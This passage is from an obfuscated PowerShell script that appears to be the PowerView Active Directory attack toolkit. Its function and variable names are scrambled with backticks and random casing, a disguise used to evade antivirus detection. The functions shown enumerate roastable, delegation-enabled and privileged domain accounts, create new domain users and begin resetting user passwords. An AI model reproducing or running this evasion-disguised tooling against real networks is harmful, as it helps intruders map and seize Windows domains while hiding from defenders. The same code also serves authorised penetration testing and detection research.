        ${gRouPrEfERE`NCEp`R`opeR`T`YsEt} = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        ${ComP`UTERREF`ER`e`NceproPer`TySET} = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        ${SEaRC`HEr`ArguMen`TS} = @{}
        if (${pS`BOun`Dp`ArA`mET`ErS}['Domain']) { ${SEARCheRA`RGU`M`e`NtS}['Domain'] = ${dOm`AIn} }
        if (${p`sB`oun`DPaRaMete`Rs}['LDAPFilter']) { ${sE`ARC`He`RArgUMe`NtS}['LDAPFilter'] = ${LdA`pF`i`lteR} }
        if (${p`S`BouN`DpaRAm`et`Ers}['SearchBase']) { ${sE`ARcheRArG`UMeN`Ts}['SearchBase'] = ${sE`AR`cHbase} }
        if (${PsBOU`NDP`ARam`eT`ers}['Server']) { ${se`ARchE`R`ARGum`ENts}['Server'] = ${sE`R`VeR} }
        if (${PSb`OUN`DPARA`MeTe`Rs}['SearchScope']) { ${S`E`ArCh`eRaR`G`UMeNts}['SearchScope'] = ${Se`Arc`hS`CoPe} }
        if (${p`s`B`OuNDpAramet`e`Rs}['ResultPageSize']) { ${SearcHeraR`G`Um`EN`TS}['ResultPageSize'] = ${ReSULT`p`A`Ges`IZE} }
        if (${Psbou`Ndp`A`R`AmetE`RS}['ServerTimeLimit']) { ${sEA`RcH`E`RarGU`mENts}['ServerTimeLimit'] = ${seRVEr`T`i`MELImIT} }
        if (${PsbOunD`P`ArAMe`T`ERS}['Tombstone']) { ${sea`RChE`R`ARGUMeNtS}['Tombstone'] = ${TO`MBS`T`oNE} }
        if (${p`SBO`U`N`DpA`RAMeTerS}['Credential']) { ${S`EA`RCheRar`GUMEnts}['Credential'] = ${cR`edENtI`Al} }

        
        if (${pSbo`UN`D`P`ARAM`eTeRS}['Domain']) {
            if (${Ps`BO`U`NdPARaMe`Te`RS}['Credential']) {
                ${t`A`RgeTf`OrEst} = gE`T-DOM`AiN -Domain ${Dom`AIn} | s`eL`EcT`-oBJE`CT -ExpandProperty FORE`St | sELEc`T-`obJect -ExpandProperty NA`Me
            }
            else {
                ${TaRgET`FOR`e`ST} = g`eT-dOm`Ain -Domain ${Do`Ma`In} -Credential ${C`RedE`NTiaL} | Se`Lec`T-OBjEct -ExpandProperty F`oReSt | Se`LecT-`o`Bject -ExpandProperty NA`ME
            }
            WRIT`E-vE`R`BOse "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        ${scheMaArG`UM`E`NtS} = @{}
        if (${pSBOUN`dP`ARa`mEtERS}['Credential']) { ${sch`E`maArg`UMeNTS}['Credential'] = ${crED`eNt`IAl} }
        if (${TA`RgeT`FOReSt}) {
            ${SChemAaRg`U`m`e`NtS}['Forest'] = ${tAR`GeTFor`est}
        }
    }

    PROCESS {

        if (${P`Sb`O`UnDParAMet`E`Rs}['ReferencePropertySet']) {
            w`RIT`e-V`ErbOSe "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            ${R`EF`eR`eNC`eOBjE`cTpRoPe`RtIes} = ${RefERenC`Ep`ROPerTYS`ET}
        }
        elseif (${PSbO`Undp`AramEte`RS}['ReferenceObject']) {
            Wr`itE-VER`B`osE "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            ${r`E`FeReNCE`ObjEcT`Pro`per`Ties} = g`Et-m`EMber -InputObject ${refEREN`Ce`oBje`cT} -MemberType noTEpR`oP`Erty | sEL`EcT-o`B`j`ECT -Expand N`AME
            ${RefErEnC`E`O`BJEctcLass} = ${reFeR`eN`ceOBJ`eCT}.objectclass | sE`lEct-`ob`ject -Last 1
            w`Rite`-`VERbOsE "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            WRi`T`e-`V`eRbOsE "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if ((${clA`sSn`A`ME} -eq 'User') -or (${ReFER`en`CEO`B`JEC`TCLAsS} -eq 'User')) {
            ${oBJe`CTS} = g`e`T-d`OMaINuSER @SearcherArguments
            if (-not ${R`e`FEREN`CEo`BJe`CTpR`o`peRties}) {
                ${RefeR`enceo`BJEc`Tprop`e`Rt`ieS} = ${Us`eRReFeReNC`EPr`O`P`Ert`YSEt}
            }
        }
        elseif ((${C`LA`SsnA`ME} -eq 'Group') -or (${RE`FeR`eNCEobJE`ctCl`ASS} -eq 'Group')) {
            ${OBJE`C`Ts} = g`ET-doMA`InGr`oUP @SearcherArguments
            if (-not ${r`eFERENcEOBJ`EctpRopE`R`TIeS}) {
                ${r`EF`ERe`NceOb`je`ct`pROpE`RtIeS} = ${GrOup`ReFE`RENc`eProper`T`yseT}
            }
        }
        elseif ((${c`laSsna`ME} -eq 'Computer') -or (${rE`FEre`NcEO`B`JeCtclAsS} -eq 'Computer')) {
            ${ob`Jec`TS} = Ge`T`-dOmA`i`NCom`PUTEr @SearcherArguments
            if (-not ${rE`FE`R`enCE`oBj`EctprOperTieS}) {
                ${REFErE`NCeOb`jEcTP`RO`p`e`RtieS} = ${cOm`pU`TeRre`FE`Re`NcepropERTYs`et}
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach (${ob`je`Ct} in ${ob`j`eCTs}) {
            ${OBjE`CTp`RO`P`eRTIES} = GEt`-M`EmBer -InputObject ${obj`Ect} -MemberType nOTE`p`Rop`erty | sELEc`T-o`BjECT -Expand na`mE
            ForEach(${objeCT`PrOP`eR`TY} in ${o`BJectPrope`RTi`eS}) {
                if (${rEfeREN`CEobj`ectP`R`OP`ERtIEs} -NotContains ${Obj`eCtP`R`Op`erty}) {
                    ${o`Ut} = n`EW-O`BJe`CT pS`oB`jeCT
                    ${o`UT} | adD-`MEMb`Er No`TEP`RO`pErtY 'SamAccountName' ${o`BJe`ct}.SamAccountName
                    ${o`UT} | ADD-`mE`MBER N`oTeP`ROpeRty 'Property' ${O`BjECtproP`eRty}
                    ${O`Ut} | ADD-MEm`B`er NOTEp`Ro`Per`Ty 'Value' ${OB`j`Ect}.${obJeCT`PR`O`PErTY}
                    ${O`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    ${O`Ut}
                }
            }
        }
    }
}








function geT`-`Doma`in`USer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'Enabled')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${tr`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${iD`enT`itY},

        [Switch]
        ${s`Pn},

        [Switch]
        ${AD`mIN`co`UnT},

        [Parameter(ParameterSetName = 'Enabled')]
        [Switch]
        ${e`N`ABlED},

        [Parameter(ParameterSetName = 'Disabled')]
        [Switch]
        ${dI`sa`BlEd},

        [Switch]
        ${LOC`KeD},

        [Switch]
        ${uNL`ock`ed},

        [Switch]
        ${p`ASs`ex`pIreD},

        [Switch]
        ${paS`SnoT`E`x`pirEd},

        [Switch]
        ${ALloWdEL`EgA`TiON},

        [Switch]
        ${DiSA`L`lOWDELeG`AtIoN},

        [Switch]
        ${No`PaSsE`x`PIrY},

        [Switch]
        ${unCo`N`ST`RaiN`Ed},

        [Switch]
        ${TRuS`T`EdT`oaUTH},

        [Switch]
        ${RB`cd},

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${pR`E`AU`THn`OtRe`Q`UirEd},

        [Switch]
        ${pASS`No`TR`equ`IrEd},

        [ValidateRange(1, 10000)]
        [Int]
        ${P`ASsLasT`S`eT},

        [Switch]
        ${o`WNER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${Ld`A`pFI`lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROP`eRTI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SE`ARchb`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${SE`RvER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${s`EaRChS`copE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eS`Ul`TPAgesI`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`erve`RtI`M`elimit},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${SE`CurI`Ty`m`ASKS},

        [Switch]
        ${T`oM`BSTo`Ne},

        [Alias('ReturnOne')]
        [Switch]
        ${f`INDo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`ed`E`NTIaL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`Aw},

        [Switch]
        ${S`SL},

        [Switch]
        ${oBFu`sc`ATE}
    )

    DynamicParam {
        ${uACV`ALU`eNa`mEs} = [Enum]::GetNames(${Ua`cEn`UM})
        
        ${UA`cVAl`UENames} = ${u`ACv`ALueNA`Mes} | fo`ReACh-o`BJe`CT {${_}; "NOT_$_"}
        
        ne`w-D`YnaMiCPa`RaME`Ter -Name uA`cFILT`eR -ValidateSet ${Ua`CvALUe`NAM`eS} -Type ([array])
    }

    BEGIN {
        ${sEar`c`h`EraRGumen`Ts} = @{}
        if (${PsB`O`UNDp`A`Ra`MeTeRS}['Domain']) { ${SEAR`cHeRA`RGu`mENts}['Domain'] = ${Do`M`Ain} }
        if (${pSboUnd`p`ArAmeTe`RS}['Properties']) { ${s`Ea`RcHEr`ArgUm`EnTs}['Properties'] = ${P`Rope`RTi`es} }
        if (${Ps`B`oUN`dpArAMeT`eRs}['Owner']) { ${s`EarCHERa`R`Gu`mEN`Ts}['Properties'] = '*' }
        if (${ps`BOUNdpa`R`A`mETE`RS}['SearchBase']) { ${sE`ArChe`R`A`RguMEnTs}['SearchBase'] = ${SE`ArcHB`AsE} }
        if (${PsbOun`DPaRAMEt`E`Rs}['Server']) { ${Se`ARcHerA`Rg`UMENtS}['Server'] = ${S`Er`VEr} }
        if (${psbOU`N`DparaME`TeRs}['SearchScope']) { ${SEA`RChERA`Rgu`mEnts}['SearchScope'] = ${sE`ARCH`s`COPe} }
        if (${P`sbOUnd`PAra`MeTERs}['ResultPageSize']) { ${seARc`He`RArGuMEN`TS}['ResultPageSize'] = ${resUL`TPAG`E`sI`ze} }
        if (${Psbou`Nd`pARAmE`T`eRs}['ServerTimeLimit']) { ${Se`ARcH`ErarGUM`entS}['ServerTimeLimit'] = ${SEr`Ver`TimELi`MIt} }
        if (${pSBOun`DP`ARA`MET`e`Rs}['SecurityMasks']) { ${S`EaR`ch`erarGUm`entS}['SecurityMasks'] = ${SECu`RitYMAs`kS} }
        if (${pSBOun`d`PAraM`eterS}['Owner']) { ${SearC`H`e`RArgUmeNtS}['SecurityMasks'] = 'Owner' }
        if (${psB`O`UNdPArAmET`ERS}['Tombstone']) { ${Se`AR`chEr`ArgumE`NTS}['Tombstone'] = ${T`om`BstO`NE} }
        if (${p`SbOUNdpA`RAme`TeRS}['Credential']) { ${sEA`RCH`erAR`GUM`e`NtS}['Credential'] = ${C`R`edenT`iaL} }
        if (${PsB`OuNdPA`RAm`etERs}['SSL']) { ${SEar`C`H`era`RgUmENTs}['SSL'] = ${s`SL} }
        if (${p`sBo`UN`dparaMeTERs}['Obfuscate']) {${SEarChErAr`G`U`m`entS}['Obfuscate'] = ${o`B`FuScaTe} }

        ${Po`liCYAr`GUmEn`TS} = @{}
        if (${psB`oUnDp`ARa`MeTe`Rs}['Domain']) { ${pO`LiCY`A`RGuMEN`TS}['Domain'] = ${dom`AIN} }
        if (${PsBO`UNdPA`RAmeTe`Rs}['Server']) { ${p`OLICYargUme`N`Ts}['Server'] = ${s`ErV`ER} }
        if (${pSBoUNdpA`RA`meTe`RS}['ServerTimeLimit']) { ${PoLi`c`YaRgU`Me`NtS}['ServerTimeLimit'] = ${sE`RvErtI`MELim`it} }
        if (${PsbO`UN`Dp`A`RAMeTERS}['Credential']) { ${p`O`lIcyaRg`U`mENTS}['Credential'] = ${cRede`NT`Ial} }
    }

    PROCESS {
        
        if (${pS`BOuNdparaM`eT`E`Rs} -and (${p`s`BOU`NDpaRA`mETeRs}.Count -ne 0)) {
            nE`W-dy`NAm`IcP`ARam`Et`eR -CreateVariables -BoundParameters ${PsBo`UN`DPar`AMeterS}
        }

        ${iDeNTi`TyFIlT`eR} = ''
        ${FIlT`ER} = ''
        ${ma`XimuMA`Ge} = ${nu`lL}
        ${ide`N`TiTy} | whERE-`ObjE`CT {${_}} | fo`RE`AcH-obJE`ct {
            ${iDen`TiTyiNs`T`ANCE} = ${_}.Replace('(', '\28').Replace(')', '\29')
            if (${Ide`NT`ITyi`Ns`TANcE} -match '^S-1-') {
                ${i`Denti`TY`FiLt`eR} += "(objectsid=$IdentityInstance)"
            }
            elseif (${iDEn`TiTYIn`sTa`NcE} -match '^CN=') {
                ${Id`E`NTITy`FI`LTer} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${psb`Ound`Param`E`T`ers}['Domain']) -and (-not ${PsB`ou`Nd`PAR`AMet`ERs}['SearchBase'])) {
                    
                    
                    ${ideNTiTyd`o`Ma`in} = ${I`d`En`TITyIns`T`ANce}.SubString(${I`D`enTiTyIN`St`ANcE}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    wri`T`E-VeRB`OsE "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                    ${s`eA`RChERARgu`me`NtS}['Domain'] = ${i`Den`T`i`TYdOMaIn}
                }
            }
            elseif (${i`deNti`TY`INsTANcE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${gUi`D`By`TEStr`Ing} = (([Guid]${I`d`eNTITyInst`AnCe}).ToByteArray() | foRe`AcH`-ob`jecT { '\' + ${_}.ToString('X2') }) -join ''
                ${i`DE`NT`ityfI`LTEr} += "(objectguid=$GuidByteString)"
            }
            elseif (${iD`e`NTItyInSTAn`Ce}.Contains('\')) {
                ${coNVeRTedI`DEntIt`y`In`s`TA`NCe} = ${idENTI`T`YInsT`Ance}.Replace('\28', '(').Replace('\29', ')') | con`VER`T-ad`NAmE -OutputType caN`ONI`CAL
                if (${cONve`RtEdIdEN`TiT`YiNstAN`cE}) {
                    ${U`Se`RdOma`In} = ${CONV`e`RTEDi`DE`NT`itYInstAN`ce}.SubString(0, ${COn`VeRt`EDID`enTiT`YinS`TAn`CE}.IndexOf('/'))
                    ${UseRna`me} = ${I`DEntITYiNsta`N`ce}.Split('\')[1]
                    ${id`e`NTItyfi`lT`ER} += "(samAccountName=$UserName)"
                    ${sEarCH`eR`A`RGumE`NTs}['Domain'] = ${U`seRd`omAIn}
                    wRIte-veR`B`OSe "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                }
            }
            else {
                ${I`De`NTit`yf`iLteR} += "(samAccountName=$IdentityInstance)"
            }
        }

        if (${iDe`N`TiT`yFiLT`eR} -and (${ID`e`NTiTyF`iLtEr}.Trim() -ne '') ) {
            ${FILT`ER} += "(|$IdentityFilter)"
        }

        if (${PS`BoUN`d`P`ARAmet`erS}['SPN']) {
            wRIT`e`-vErBosE '[Get-DomainUser] Searching for non-null service principal names'
            ${fiL`Ter} += '(servicePrincipalName=*)'
        }
        if (${Ps`BOUn`dP`ARaMetERS}['Enabled']) {
            wRiTe-`Ver`Bose '[Get-DomainUser] Searching for users who are enabled'
            
            ${FIL`Ter} += '(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
        }
        if (${Ps`B`oUNdPaRame`TERS}['Disabled']) {
            w`R`Ite-v`E`RBOSE '[Get-DomainUser] Searching for users who are disabled'
            
            ${FI`lT`er} += '(userAccountControl:1.2.840.113556.1.4.803:=2)'
        }
        if (${psbOun`DP`AraMeT`erS}['Locked']) {
            WriTE`-`VE`RBoSE '[Get-DomainUser] Searching for users who are locked'
            
            ${dU`RA`TIOn} = ((gET-d`omaInpol`i`CY -Policy Do`main @PolicyArguments).SystemAccess).LockoutDuration
            if (${DuRaT`iON} -eq -1) {
                ${l`O`cKouttIME} = 1
            }
            else {
                ${LoCkO`U`T`TImE} = (GEt`-DA`Te).AddMinutes(-${DU`Ra`TIon}).ToFileTimeUtc()
            }
            ${F`i`lteR} += "(lockoutTime>=$LockoutTime)"
        }
        elseif (${p`s`B`oUnDPaRa`mEt`Ers}['Unlocked']) {
            wr`Ite`-ver`BosE '[Get-DomainUser] Searching for users who are unlocked'
            
            ${d`U`RATiOn} = ((g`Et`-domAINp`oLIcy -Policy D`om`AIN @PolicyArguments).SystemAccess).LockoutDuration
            if (${DURatI`on} -eq -1) {
                ${lO`Ck`OUTtIMe} = 1
            }
            else {
                ${LoCKOu`TT`IMe} = (geT`-`DAte).AddMinutes(-${du`RAti`oN}).ToFileTimeUtc()
            }
            ${Fi`lT`er} += "(!(lockoutTime>=$LockoutTime))"
        }
        if (${psb`O`UNDPA`RA`m`etERs}['PassExpired']) {
            WrI`TE-ve`RB`ose '[Get-DomainUser] Ignoring users that have passwords to never expire'
            ${fI`L`TER} += '(!(userAccountControl:1.2.840.113556.1.4.803:=65536))'
            w`RItE-veRBo`sE '[Get-DomainUser] Getting the maximum password age from the domain policy'
            ${m`Ax`iMUMage} = [Int]((Get-`dOm`AINPO`l`iCY -Policy D`o`mAiN @PolicyArguments).SystemAccess).MaximumPasswordAge
            if (${Ma`Xi`m`UMAgE} -lt 1) {
                Wr`i`Te-`WA`RnInG '[Get-DomainUser] Password expiry disabled in domain policy, no users will be returned'
                return
            }
        }
        elseif (${psB`OUNdPaR`A`M`EtErs}['NoPassExpiry']) {
            wrIte-`VE`R`BOse '[Get-DomainUser] Searching for users whose passwords never expire'
            ${FI`L`TER} += '(userAccountControl:1.2.840.113556.1.4.803:=65536)'
        }
        if (${pS`B`ouNd`PAraMEterS}['PassNotExpired']) {
            WRiT`e-v`eRB`o`se "[Get-DomainUser] Getting the maximum password age from the domain policy"
            ${MAx`iM`Um`AGe} = [Int]((g`eT`-`DoMAiNp`olICy -Policy d`oMaIN @PolicyArguments).SystemAccess).MaximumPasswordAge
        }
        if (${P`sBoU`N`dparAMet`ErS}['AllowDelegation']) {
            W`RiTE-V`E`RBoSe '[Get-DomainUser] Searching for users who can be delegated'
            
            ${fI`lter} += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048576))'
        }
        elseif (${psBo`U`N`dpa`Ram`eTErS}['DisallowDelegation']) {
            WRiTE-`VER`B`OsE '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
            ${f`ilT`ER} += '(userAccountControl:1.2.840.113556.1.4.803:=1048576)'
        }
        if (${pSboUND`p`ARa`mEt`ERs}['Unconstrained']) {
            wrI`Te`-VeRB`oSE '[Get-DomainUser] Searching for users configured for unconstrained delegation'
            ${fIlT`ER} += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
        }
        if (${PsboU`NDPA`RAM`Eters}['AdminCount']) {
            wRIT`E`-VER`BO`SE '[Get-DomainUser] Searching for adminCount=1'
            ${F`Ilt`er} += '(admincount=1)'
        }
        if (${PSBo`UNdPa`RamET`Ers}['TrustedToAuth']) {
            wR`ItE-ve`Rb`oSe '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
            ${Fil`TER} += '(msds-allowedtodelegateto=*)'
        }
        if (${psboU`Ndp`A`Ra`mETE`Rs}['RBCD']) {
            Wr`ite`-vERbOse '[Get-DomainUser] Searching for users that are configured to allow resource-based constrained delegation'
            ${FIL`Ter} += '(msds-allowedtoactonbehalfofotheridentity=*)'
        }
        if (${psBOU`N`Dp`ARA`mETers}['PreauthNotRequired']) {
            wRI`TE-vE`RbOSe '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
            ${F`ILteR} += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
        }
        if (${PS`B`O`UnDPA`RamET`erS}['PassNotRequired']) {
            WRIT`E-`VERbo`SE '[Get-DomainUser] Searching for user accounts that have PASSWD_NOTREQD set'
            ${FI`LTeR} += '(userAccountControl:1.2.840.113556.1.4.803:=32)'
        }
        if (${P`Sb`OU`Nd`PArAMETe`RS}['PassLastSet']) {
            WRiTE-`VeR`B`OsE "[Get-DomainUser] Searching for user accounts that have not had a password change for at least $PSBoundParameters['PassLastSet'] days"
            ${PWd`Da`Te} = (G`et-D`AtE).AddDays(-${PsboUNd`P`AR`Am`etERS}['PassLastSet']).ToFileTime()
            ${f`iL`TEr} += "(pwdlastset<=$PwdDate)"
        }

        if (${psbou`N`Dp`Ara`mEtErS}['LDAPFilter']) {
            w`RItE-`Ver`BoSE "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
            ${fIL`Ter} += "$LDAPFilter"
        }

        
        ${UAc`FilT`ER} | WHere-oB`j`E`ct {${_}} | FOREAc`H-OBJ`E`Ct {
            if (${_} -match 'NOT_.*') {
                ${UA`cf`I`elD} = ${_}.Substring(4)
                ${u`AC`V`Alue} = [Int](${UaCEN`Um}::${U`ACfIE`ld})
                ${FIlt`Er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${Uacv`AL`UE} = [Int](${uA`CENuM}::${_})
                ${fi`L`TER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }

        w`RiTE-VE`Rb`oSe "[Get-DomainUser] filter string: (&(samAccountType=805306368)$Filter"

        ${res`UL`Ts} = I`NvO`KE`-LdAPQUe`Ry @SearcherArguments -LDAPFilter "(&(samAccountType=805306368)$Filter)"

        ${Res`UL`TS} | WhERe-o`BJ`e`Ct {${_}} | FOreaC`H`-ObJE`CT {
            if (G`ET`-memBEr -inputobject ${_} -name "Attributes" -Membertype P`RoPert`ies) {
                ${Pr`oP} = @{}
                foreach (${A} in ${_}.Attributes.Keys | SOr`T`-oBj`ECt) {
                    if ((${a} -eq 'objectsid') -or (${A} -eq 'sidhistory') -or (${a} -eq 'objectguid') -or (${A} -eq 'usercertificate') -or (${A} -eq 'ntsecuritydescriptor') -or (${a} -eq 'logonhours')) {
                        ${Pr`op}[${A}] = ${_}.Attributes[${a}]
                    }
                    else {
                        ${V`A`luEs} = @()
                        foreach (${V} in ${_}.Attributes[${a}].GetValues([byte[]])) {
                            ${V`ALU`eS} += [System.Text.Encoding]::UTF8.GetString(${V})
                        }
                        ${pr`OP}[${A}] = ${VAL`Ues}
                    }
                }
            }
            else {
                ${p`RoP} = ${_}.Properties
            }

            ${C`onT`iNUe} = ${t`RUe}
            if (${pSb`Ou`NDPa`RAMeTeRS}['PassExpired']) {
                if (${MaXIM`Uma`ge} -gt 0) {
                    ${Pw`DLAsTS`eT} = ${Pr`Op}.pwdlastset[0]
                    if (${PWDlaS`Ts`Et} -eq 0) {
                        ${P`WdLAST`seT} = ${P`Rop}.whencreated[0]
                    }
                    ${ExpI`R`ETIME} = (GET-D`ATe).AddDays(-${m`Ax`ImU`maGe}).ToFileTimeUtc()
                    if (${P`wdLA`s`TseT} -gt ${ExpIR`E`TIMe}) {
                        ${co`NtiN`UE} = ${FA`lsE}
                    }
                }
                else {
                    ${coN`T`InUE} = ${Fal`Se}
                }
            }
            elseif (${PSB`oUND`paRAm`EterS}['PassNotExpired'] -and ((${PR`oP}.useraccountcontrol[0] -band 65536) -ne 65536)) {
                if (${ma`XIMUMA`Ge} -gt 0) {
                    ${P`w`dLasTset} = ${p`ROP}.pwdlastset[0]
                    if (${PWd`l`ASts`eT} -eq 0) {
                        ${p`wdlaSt`Set} = ${p`Rop}.whencreated[0]
                    }
                    ${ex`p`IREt`imE} = (geT`-D`ATE).AddDays(-${maximu`m`AGE}).ToFileTimeUtc()
                    if (${P`w`dLaSt`seT} -le ${e`xP`IRet`IMe}) {
                        ${CO`NTI`N`Ue} = ${f`ALSE}
                    }
                }
            }
            if (${CoN`Ti`NUe}) {
                if (${psB`O`U`N`DPaRamEtErs}['Raw']) {
                    
                    ${u`seR} = ${_}
                    ${U`seR}.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    ${U`SEr} = c`oNVEr`T-lDAPpR`OpE`RTY -Properties ${P`ROP}
                    ${US`eR}.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                ${U`sEr}
            }
        }
        if (${RES`Ul`TS}) {
            try { ${r`e`SULTs}.dispose() }
            catch { }
        }
    }
}


function New`-D`OM`A`iNuSer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = ${T`Rue})]
        [ValidateLength(0, 256)]
        [String]
        ${Sa`MaccO`U`N`TnAME},

        [Parameter(Mandatory = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        ${AcCou`N`TPa`sswoRD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${NA`Me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`is`p`lAYnAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DE`SCR`ip`TiOn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`Om`AiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dE`N`TIal} = [Management.Automation.PSCredential]::Empty
    )

    ${coNtE`x`TA`R`gUMenTs} = @{
        'Identity' = ${Sa`Ma`cc`oUnTNa`me}
    }
    if (${PSb`ouNdpAr`AM`E`TERS}['Domain']) { ${coNtE`X`TA`R`gUmeNTS}['Domain'] = ${d`OM`AiN} }
    if (${pS`BOUND`pAr`AMETeRS}['Credential']) { ${C`oNt`exT`A`RGUMeNTS}['Credential'] = ${c`RedEN`T`Ial} }
    ${CO`N`TExT} = ge`T`-`pr`InCipalContEXT @ContextArguments

    if (${C`OnTe`XT}) {
        ${U`SER} = N`Ew-oB`jEct -TypeName sYST`E`m.dIReCt`O`R`Y`serVicEs.a`cco`UN`TmAnAgEm`Ent.Use`R`P`RInc`ipAL -ArgumentList (${c`ONTeXt}.Context)

        
        ${US`ER}.SamAccountName = ${CoNt`EXT}.Identity
        ${Te`m`pCrEd} = NEw-`ObJ`ect sy`ST`eM`.Ma`NAGeMeNT.a`U`TOMAt`IoN.P`s`CReDeNtiAl('a', ${ACcOUN`T`p`Ass`wO`RD})
        ${Us`eR}.SetPassword(${t`emPcR`ED}.GetNetworkCredential().Password)
        ${u`ser}.Enabled = ${TR`UE}
        ${US`Er}.PasswordNotRequired = ${FA`l`SE}

        if (${PSBOunD`ParA`Me`TeRs}['Name']) {
            ${U`seR}.Name = ${nA`mE}
        }
        else {
            ${U`SeR}.Name = ${cO`NT`exT}.Identity
        }
        if (${PsboUndpaR`AmEt`e`RS}['DisplayName']) {
            ${us`eR}.DisplayName = ${DI`SPlA`y`NaMe}
        }
        else {
            ${us`Er}.DisplayName = ${cO`NtE`XT}.Identity
        }

        if (${psB`oUnd`p`ArAmeT`eRs}['Description']) {
            ${uS`er}.Description = ${DE`S`CRIpTI`on}
        }

        wRiTe-`VEr`BoSe "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            ${NU`Ll} = ${U`sER}.Save()
            W`Rit`E-`VeRBO`sE "[New-DomainUser] User '$SamAccountName' successfully created"
            ${u`ser}
        }
        catch {
            wRIt`e-W`AR`NINg "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function SeT`-DO`maIN`UserP`AsswORd {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = ${Tr`UE})]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        ${Id`E`NTITY},

        [Parameter(Mandatory = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        ${A`cCoUntpAs`s`woRD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`oMAin},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`ReD`e`NtIAL} = [Management.Automation.PSCredential]::Empty
    )

    ${cO`NT`EXTAr`gUMeNtS} = @{ 'Identity' = ${IDen`T`I`Ty} }
    if (${pSboun`DPa`RaMet`Ers}['Domain']) { ${c`o`NTe`xTa`RGume`NtS}['Domain'] = ${D`o`mAIn} }
